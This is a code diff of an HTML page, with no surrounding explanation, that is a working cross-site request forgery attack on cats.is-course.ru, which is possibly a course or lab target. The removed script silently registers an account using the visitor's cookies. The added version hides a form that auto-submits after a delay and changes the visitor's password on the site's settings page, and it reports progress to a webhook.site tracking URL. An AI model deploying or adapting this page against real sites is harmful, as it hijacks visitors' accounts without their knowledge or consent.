@@ -1,8 +1,12 @@
-<!doctype html><html><head><meta charset="utf-8"></head><body><h1>nice site</h1>
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<h1>nice</h1>
+<form id="f" method="POST" action="https://cats.is-course.ru/settings" target="_top">
+<input name="password" value="Zz9!kq12345678"><input name="confirm-password" value="Zz9!kq12345678"></form>
 <script>
-var U="5169748c-49df-4307-9820-7383309d9f02", LG="csrfecyf";
-fetch("https://cats.is-course.ru/register",{method:"POST",mode:"no-cors",credentials:"include",
- headers:{"Content-Type":"application/x-www-form-urlencoded"},
- body:"login="+LG+"&password=Zz9!kq12345678&confirm-password=Zz9!kq12345678"})
- .then(function(){new Image().src="https://webhook.site/"+U+"/regok2"}).catch(function(){new Image().src="https://webhook.site/"+U+"/regerr2"});
+var U="5169748c-49df-4307-9820-7383309d9f02";
+setTimeout(function(){
+  new Image().src="https://webhook.site/"+U+"/beforesubmit";
+  document.getElementById('f').submit();
+  setTimeout(function(){new Image().src="https://webhook.site/"+U+"/still-alive"},400);
+},900);
 </script></body></html>
